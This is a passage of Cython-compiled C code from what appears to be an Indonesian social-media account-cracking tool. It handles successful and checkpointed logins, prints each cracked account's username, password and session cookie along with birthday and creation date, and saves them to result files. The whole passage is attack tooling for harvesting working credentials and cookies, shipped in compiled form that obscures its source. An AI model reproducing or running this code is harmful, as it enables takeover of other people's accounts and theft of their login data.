              __pyx_t_13 = __Pyx_PyObject_Dict_GetItem(__pyx_v_profile, __pyx_n_u_birthday); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 251, __pyx_L5_error)
              __Pyx_GOTREF(__pyx_t_13);
              __pyx_t_14 = __Pyx_PyUnicode_FormatSafe(__pyx_kp_u_Tgl_Lahir_theme_s, __pyx_t_13); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 251, __pyx_L5_error)
              __Pyx_GOTREF(__pyx_t_14);
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
              __pyx_t_13 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
                __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_10);
                if (likely(__pyx_t_13)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
                  __Pyx_INCREF(__pyx_t_13);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_10, function);
                }
              }
              __pyx_t_12 = (__pyx_t_13) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_13, __pyx_t_14) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_14);
              __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
              __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
              if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 251, __pyx_L5_error)
              __Pyx_GOTREF(__pyx_t_12);
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

               
              goto __pyx_L18;
            }

             
              {
              __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_root, __pyx_n_s_add); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 253, __pyx_L5_error)
              __Pyx_GOTREF(__pyx_t_10);
              __pyx_t_14 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
                __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_10);
                if (likely(__pyx_t_14)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
                  __Pyx_INCREF(__pyx_t_14);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_10, function);
                }
              }
              __pyx_t_12 = (__pyx_t_14) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_14, __pyx_kp_u_Tgl_Lahir_bold_red_Tidak_ada) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_kp_u_Tgl_Lahir_bold_red_Tidak_ada);
              __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
              if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 253, __pyx_L5_error)
              __Pyx_GOTREF(__pyx_t_12);
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            }
            __pyx_L18:;

             
            __pyx_t_12 = __Pyx_PyObject_Dict_GetItem(__pyx_v_profile, __pyx_n_u_created_at); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 254, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_9 = __Pyx_PyObject_IsTrue(__pyx_t_12); if (unlikely(__pyx_t_9 < 0)) __PYX_ERR(0, 254, __pyx_L5_error)
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            if (__pyx_t_9) {

               
              __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_root, __pyx_n_s_add); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 255, __pyx_L5_error)
              __Pyx_GOTREF(__pyx_t_10);
              __pyx_t_14 = __Pyx_PyObject_Dict_GetItem(__pyx_v_profile, __pyx_n_u_created_at); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 255, __pyx_L5_error)
              __Pyx_GOTREF(__pyx_t_14);
              __pyx_t_13 = __Pyx_PyUnicode_FormatSafe(__pyx_kp_u_Tgl_Pembuatan_Akun_theme_s, __pyx_t_14); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 255, __pyx_L5_error)
              __Pyx_GOTREF(__pyx_t_13);
              __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
              __pyx_t_14 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
                __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_10);
                if (likely(__pyx_t_14)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
                  __Pyx_INCREF(__pyx_t_14);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_10, function);
                }
              }
              __pyx_t_12 = (__pyx_t_14) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_14, __pyx_t_13) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_13);
              __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
              if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 255, __pyx_L5_error)
              __Pyx_GOTREF(__pyx_t_12);
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

               
              goto __pyx_L19;
            }

             
              {
              __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_root, __pyx_n_s_add); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 257, __pyx_L5_error)
              __Pyx_GOTREF(__pyx_t_10);
              __pyx_t_13 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
                __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_10);
                if (likely(__pyx_t_13)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
                  __Pyx_INCREF(__pyx_t_13);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_10, function);
                }
              }
              __pyx_t_12 = (__pyx_t_13) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_13, __pyx_kp_u_Tgl_Pembuatan_Akun_bold_red_Tida) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_kp_u_Tgl_Pembuatan_Akun_bold_red_Tida);
              __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
              if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 257, __pyx_L5_error)
              __Pyx_GOTREF(__pyx_t_12);
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            }
            __pyx_L19:;

             
            __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_root, __pyx_n_s_add); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 258, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_13 = __Pyx_PyUnicode_FormatSafe(__pyx_kp_u_Cookie_theme_s, __pyx_v_cookie); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 258, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_13);
            __pyx_t_14 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
              __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_10);
              if (likely(__pyx_t_14)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
                __Pyx_INCREF(__pyx_t_14);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_10, function);
              }
            }
            __pyx_t_12 = (__pyx_t_14) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_14, __pyx_t_13) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_13);
            __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
            __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
            if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 258, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_12);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

             
            goto __pyx_L15;
          }

           
            {
            __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_tree); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 260, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_13 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
              __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_10);
              if (likely(__pyx_t_13)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
                __Pyx_INCREF(__pyx_t_13);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_10, function);
              }
            }
            __pyx_t_12 = (__pyx_t_13) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_13, __pyx_kp_u__6) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_kp_u__6);
            __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
            if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 260, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_12);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_XDECREF_SET(__pyx_v_root, __pyx_t_12);
            __pyx_t_12 = 0;

             
            __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_root, __pyx_n_s_add); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 261, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_13 = PyTuple_New(6); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 261, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_13);
            __pyx_t_8 = 0;
            __pyx_t_16 = 127;
            __Pyx_INCREF(__pyx_kp_u_bold_green);
            __pyx_t_8 += 12;
            __Pyx_GIVEREF(__pyx_kp_u_bold_green);
            PyTuple_SET_ITEM(__pyx_t_13, 0, __pyx_kp_u_bold_green);
            __pyx_t_14 = __Pyx_PyObject_Dict_GetItem(__pyx_v_login, __pyx_n_u_username); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 261, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_14);
            __pyx_t_11 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_t_14), __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 261, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
            __pyx_t_16 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) > __pyx_t_16) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) : __pyx_t_16;
            __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_11);
            __Pyx_GIVEREF(__pyx_t_11);
            PyTuple_SET_ITEM(__pyx_t_13, 1, __pyx_t_11);
            __pyx_t_11 = 0;
            __Pyx_INCREF(__pyx_kp_u__16);
            __pyx_t_8 += 1;
            __Pyx_GIVEREF(__pyx_kp_u__16);
            PyTuple_SET_ITEM(__pyx_t_13, 2, __pyx_kp_u__16);
            __pyx_t_11 = __Pyx_PyObject_Dict_GetItem(__pyx_v_login, __pyx_n_u_password); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 261, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_11);
            __pyx_t_14 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_t_11), __pyx_empty_unicode); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 261, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
            __pyx_t_16 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_14) > __pyx_t_16) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_14) : __pyx_t_16;
            __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_14);
            __Pyx_GIVEREF(__pyx_t_14);
            PyTuple_SET_ITEM(__pyx_t_13, 3, __pyx_t_14);
            __pyx_t_14 = 0;
            __Pyx_INCREF(__pyx_kp_u__16);
            __pyx_t_8 += 1;
            __Pyx_GIVEREF(__pyx_kp_u__16);
            PyTuple_SET_ITEM(__pyx_t_13, 4, __pyx_kp_u__16);
            __pyx_t_14 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_v_cookie), __pyx_empty_unicode); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 261, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_14);
            __pyx_t_16 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_14) > __pyx_t_16) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_14) : __pyx_t_16;
            __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_14);
            __Pyx_GIVEREF(__pyx_t_14);
            PyTuple_SET_ITEM(__pyx_t_13, 5, __pyx_t_14);
            __pyx_t_14 = 0;
            __pyx_t_14 = __Pyx_PyUnicode_Join(__pyx_t_13, 6, __pyx_t_8, __pyx_t_16); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 261, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
            __pyx_t_13 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
              __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_10);
              if (likely(__pyx_t_13)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
                __Pyx_INCREF(__pyx_t_13);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_10, function);
              }
            }
            __pyx_t_12 = (__pyx_t_13) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_13, __pyx_t_14) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_14);
            __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
            if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 261, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_12);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

             
            __pyx_t_12 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 262, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_10 = __Pyx_PyObject_Dict_GetItem(__pyx_v_users, __pyx_n_u_name); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 262, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_10);
            if (PyDict_SetItem(__pyx_t_12, __pyx_n_s_name, __pyx_t_10) < 0) __PYX_ERR(0, 262, __pyx_L5_error)
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_XDECREF_SET(__pyx_v_profile, __pyx_t_12);
            __pyx_t_12 = 0;
          }
          __pyx_L15:;

           
          __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_print); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 264, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_10);
          __pyx_t_14 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
            __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_10);
            if (likely(__pyx_t_14)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
              __Pyx_INCREF(__pyx_t_14);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_10, function);
            }
          }
          __pyx_t_12 = (__pyx_t_14) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_14, __pyx_v_root) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_v_root);
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 264, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

           
          __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_OK); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 265, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_12);
          __pyx_t_10 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 265, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_10);
          __pyx_t_14 = __Pyx_PyObject_Dict_GetItem(__pyx_v_login, __pyx_n_u_username); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 265, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_14);
          if (PyDict_SetItem(__pyx_t_10, __pyx_n_s_username, __pyx_t_14) < 0) __PYX_ERR(0, 265, __pyx_L5_error)
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __pyx_t_14 = __Pyx_PyObject_Dict_GetItem(__pyx_v_login, __pyx_n_u_password); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 265, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_14);
          if (PyDict_SetItem(__pyx_t_10, __pyx_n_s_password, __pyx_t_14) < 0) __PYX_ERR(0, 265, __pyx_L5_error)
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __pyx_t_17 = __Pyx_PyObject_Append(__pyx_t_12, __pyx_t_10); if (unlikely(__pyx_t_17 == ((int)-1))) __PYX_ERR(0, 265, __pyx_L5_error)
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

           
          __pyx_t_10 = __Pyx_PyObject_Dict_GetItem(__pyx_v_login, __pyx_n_u_username); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 266, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_10);
          __pyx_t_12 = __Pyx_PyObject_Dict_GetItem(__pyx_v_login, __pyx_n_u_password); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 266, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_json); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 266, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_13);
          __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_13, __pyx_n_s_dumps); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 266, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_11);
          __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
          __pyx_t_13 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 266, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_13);
          if (PyDict_SetItem(__pyx_t_13, __pyx_n_s_profile, __pyx_v_profile) < 0) __PYX_ERR(0, 266, __pyx_L5_error)
          if (PyDict_SetItem(__pyx_t_13, __pyx_n_s_cookie, __pyx_v_cookie) < 0) __PYX_ERR(0, 266, __pyx_L5_error)
          __pyx_t_1 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_11))) {
            __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_11);
            if (likely(__pyx_t_1)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
              __Pyx_INCREF(__pyx_t_1);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_11, function);
            }
          }
          __pyx_t_14 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_11, __pyx_t_1, __pyx_t_13) : __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_13);
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
          if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 266, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_14);
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          __pyx_t_11 = PyList_New(3); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 266, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_11);
          __Pyx_GIVEREF(__pyx_t_10);
          PyList_SET_ITEM(__pyx_t_11, 0, __pyx_t_10);
          __Pyx_GIVEREF(__pyx_t_12);
          PyList_SET_ITEM(__pyx_t_11, 1, __pyx_t_12);
          __Pyx_GIVEREF(__pyx_t_14);
          PyList_SET_ITEM(__pyx_t_11, 2, __pyx_t_14);
          __pyx_t_10 = 0;
          __pyx_t_12 = 0;
          __pyx_t_14 = 0;
          __Pyx_XDECREF_SET(__pyx_v_account, ((PyObject*)__pyx_t_11));
          __pyx_t_11 = 0;

           
          __pyx_t_14 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_utils); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 267, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_14);
          __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_14, __pyx_n_s_save_result); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 267, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __pyx_t_14 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_OK_FILES_SAVED); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 267, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_14);
          __pyx_t_10 = PyUnicode_Join(__pyx_kp_u__16, __pyx_v_account); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 267, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_10);
          __pyx_t_13 = NULL;
          __pyx_t_15 = 0;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
            __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_12);
            if (likely(__pyx_t_13)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
              __Pyx_INCREF(__pyx_t_13);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_12, function);
              __pyx_t_15 = 1;
            }
          }
          #if CYTHON_FAST_PYCALL
          if (PyFunction_Check(__pyx_t_12)) {
            PyObject *__pyx_temp[3] = {__pyx_t_13, __pyx_t_14, __pyx_t_10};
            __pyx_t_11 = __Pyx_PyFunction_FastCall(__pyx_t_12, __pyx_temp+1-__pyx_t_15, 2+__pyx_t_15); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 267, __pyx_L5_error)
            __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
          } else
          #endif
          #if CYTHON_FAST_PYCCALL
          if (__Pyx_PyFastCFunction_Check(__pyx_t_12)) {
            PyObject *__pyx_temp[3] = {__pyx_t_13, __pyx_t_14, __pyx_t_10};
            __pyx_t_11 = __Pyx_PyCFunction_FastCall(__pyx_t_12, __pyx_temp+1-__pyx_t_15, 2+__pyx_t_15); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 267, __pyx_L5_error)
            __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
          } else
          #endif
          {
            __pyx_t_1 = PyTuple_New(2+__pyx_t_15); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 267, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_1);
            if (__pyx_t_13) {
              __Pyx_GIVEREF(__pyx_t_13); PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_13); __pyx_t_13 = NULL;
            }
            __Pyx_GIVEREF(__pyx_t_14);
            PyTuple_SET_ITEM(__pyx_t_1, 0+__pyx_t_15, __pyx_t_14);
            __Pyx_GIVEREF(__pyx_t_10);
            PyTuple_SET_ITEM(__pyx_t_1, 1+__pyx_t_15, __pyx_t_10);
            __pyx_t_14 = 0;
            __pyx_t_10 = 0;
            __pyx_t_11 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_t_1, NULL); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 267, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          }
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

           
          goto __pyx_L10_try_break;

           
        }

         
        __pyx_t_11 = __Pyx_PyObject_Dict_GetItem(__pyx_v_login, __pyx_n_u_status); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 269, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_9 = (__Pyx_PyUnicode_Equals(__pyx_t_11, __pyx_n_u_cp, Py_EQ)); if (unlikely(__pyx_t_9 < 0)) __PYX_ERR(0, 269, __pyx_L5_error)
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (__pyx_t_9) {

           
          __pyx_t_11 = __Pyx_PyDict_GetItem(__pyx_v_kwargs, __pyx_n_u_show_info); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 270, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_9 = __Pyx_PyObject_IsTrue(__pyx_t_11); if (unlikely(__pyx_t_9 < 0)) __PYX_ERR(0, 270, __pyx_L5_error)
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          if (__pyx_t_9) {

             
            __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_profile_channel); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 271, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_1 = __Pyx_PyObject_Dict_GetItem(__pyx_v_login, __pyx_n_u_username); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 271, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_1);
            __pyx_t_10 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
              __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_12);
              if (likely(__pyx_t_10)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
                __Pyx_INCREF(__pyx_t_10);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_12, function);
              }
            }
            __pyx_t_11 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_12, __pyx_t_10, __pyx_t_1) : __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_1);
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 271, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            __Pyx_XDECREF_SET(__pyx_v_profile, __pyx_t_11);
            __pyx_t_11 = 0;

             
            __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_tree); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 272, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_1 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
              __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_12);
              if (likely(__pyx_t_1)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
                __Pyx_INCREF(__pyx_t_1);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_12, function);
              }
            }
            __pyx_t_11 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_12, __pyx_t_1, __pyx_kp_u__6) : __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_kp_u__6);
            __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
            if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 272, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            __Pyx_XDECREF_SET(__pyx_v_root, __pyx_t_11);
            __pyx_t_11 = 0;

             
            __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_root, __pyx_n_s_add); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 273, __pyx_L5_error)
